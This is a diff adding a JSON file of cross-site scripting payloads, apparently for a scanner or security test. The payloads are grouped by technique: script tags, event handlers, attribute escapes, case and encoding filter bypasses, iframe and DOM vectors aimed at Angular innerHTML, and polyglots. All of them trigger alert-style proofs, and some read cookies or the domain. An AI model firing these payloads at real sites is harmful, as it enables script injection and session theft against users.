@@ -1,0 +1,147 @@
+{
+    "payload_families": {
+        "basic_script": {
+            "description": "Basic script tag injection",
+            "payloads": [
+                "<script>alert('xss')</script>",
+                "<script>alert(document.cookie)</script>",
+                "<script>alert(1)</script>",
+                "<script>alert(String.fromCharCode(88,83,83))</script>",
+                "<script>confirm(1)</script>",
+                "<script>prompt(1)</script>",
+                "<script>alert(document.domain)</script>",
+                "<script>window.alert(1)</script>",
+                "<script>eval('alert(1)')</script>",
+                "<script>setTimeout('alert(1)',0)</script>"
+            ]
+        },
+        "img_onerror": {
+            "description": "Image tag with error handler",
+            "payloads": [
+                "<img src=x onerror=alert('xss')>",
+                "<img src=x onerror='alert(1)'>",
+                "<img/src=x onerror=alert(document.domain)>",
+                "<img src=x onerror=alert(1)>",
+                "<img src onerror=alert(1)>",
+                "<img src=1 onerror=confirm(1)>",
+                "<img src=x onerror=prompt(1)>",
+                "<img src=x onerror=eval('alert(1)')>",
+                "<img src=x onerror=alert`1`>",
+                "<IMG SRC=x ONERROR=\"alert(1)\">",
+                "<img src=x onerror=window.alert(1)>"
+            ]
+        },
+        "svg_onload": {
+            "description": "SVG tag with onload handler",
+            "payloads": [
+                "<svg onload=alert(1)>",
+                "<svg/onload=alert('xss')>",
+                "<svg onload='alert(document.domain)'>",
+                "<svg onload=confirm(1)>",
+                "<svg><script>alert(1)</script></svg>",
+                "<svg onload=eval(atob('YWxlcnQoMSk='))>",
+                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+                "<svg onload=alert(document.cookie)>",
+                "<svg/onload=prompt(1)>"
+            ]
+        },
+        "event_handler": {
+            "description": "Various HTML event handlers",
+            "payloads": [
+                "<body onload=alert(1)>",
+                "<input onfocus=alert(1) autofocus>",
+                "<details open ontoggle=alert(1)>",
+                "<video><source onerror=alert(1)>",
+                "<marquee onstart=alert(1)>",
+                "<div onmouseover=alert(1)>hover</div>",
+                "<a onclick=alert(1) href=#>click</a>",
+                "<select onfocus=alert(1) autofocus>",
+                "<textarea onfocus=alert(1) autofocus>",
+                "<button onclick=alert(1)>btn</button>",
+                "<audio onloadstart=alert(1) src=x>"
+            ]
+        },
+        "attribute_escape": {
+            "description": "Breaking out of HTML attributes",
+            "payloads": [
+                "\"><script>alert(1)</script>",
+                "'><script>alert(1)</script>",
+                "\"><img src=x onerror=alert(1)>",
+                "' onfocus='alert(1)' autofocus='",
+                "\" onmouseover=\"alert(1)\"",
+                "' onmouseover='alert(1)'",
+                "\"><svg onload=alert(1)>",
+                "\"><details open ontoggle=alert(1)>",
+                "';alert(1)//",
+                "` onerror=alert(1) `"
+            ]
+        },
+        "case_bypass": {
+            "description": "Case variation to bypass filters",
+            "payloads": [
+                "<ScRiPt>alert(1)</ScRiPt>",
+                "<SCRIPT>alert(1)</SCRIPT>",
+                "<IMG SRC=x ONERROR=alert(1)>",
+                "<Img Src=x OnError=alert(1)>",
+                "<sVg OnLoAd=alert(1)>",
+                "<IMG/SRC=x/ONERROR=alert(1)>",
+                "<Details Open OnToggle=alert(1)>",
+                "<Input OnFocus=alert(1) Autofocus>",
+                "<BODY ONLOAD=alert(1)>"
+            ]
+        },
+        "encoding_bypass": {
+            "description": "Encoding-based filter evasion",
+            "payloads": [
+                "<script>\\u0061lert(1)</script>",
+                "<img src=x onerror=&#97;lert(1)>",
+                "<a href=javascript:alert(1)>click</a>",
+                "<a href=\"javascript:alert(1)\">xss</a>",
+                "<script>&#x61;&#x6C;&#x65;&#x72;&#x74;(1)</script>",
+                "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
+                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+                "<a href=javascript&colon;alert(1)>click</a>",
+                "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>"
+            ]
+        },
+        "nested_tags": {
+            "description": "Nested/broken tags — iframe vectors for Angular innerHTML",
+            "payloads": [
+                "<iframe src=\"javascript:alert(`xss`)\">",
+                "<iframe src=\"javascript:alert('xss')\">",
+                "<iframe src=javascript:alert(1)>",
+                "<iframe src=\"javascript:alert(document.cookie)\">",
+                "<object data=\"javascript:alert(1)\">",
+                "<<script>alert(1)//<</script>",
+                "</script><script>alert(1)</script>",
+                "<iframe onload=alert(1)>",
+                "--><script>alert(1)</script>"
+            ]
+        },
+        "dom_based": {
+            "description": "DOM-based XSS vectors targeting Angular innerHTML",
+            "payloads": [
+                "<iframe src=\"javascript:alert(`xss`)\">",
+                "<iframe width=0 height=0 src=\"javascript:alert('xss')\">",
+                "<embed src=\"javascript:alert(1)\">",
+                "<object type=\"text/html\" data=\"javascript:alert(1)\">",
+                "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
+                "<img src=1 onerror=setTimeout('alert(1)',0)>",
+                "<svg onload=Function('alert(1)')()>",
+                "<img src=x onerror=window['al'+'ert'](1)>",
+                "<img src=x onerror=(0,eval)('alert(1)')>"
+            ]
+        },
+        "polyglot": {
+            "description": "Multi-context polyglot payloads",
+            "payloads": [
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+                "'\"><img src=x onerror=alert(1)//>",
+                "<iframe src=\"javascript:alert(`xss`)\"><!--",
+                "--><script>alert(1)</script>",
+                "</script><script>alert(1)</script>",
+                "\"><svg/onload=alert(1)//"
+            ]
+        }
+    }
+}
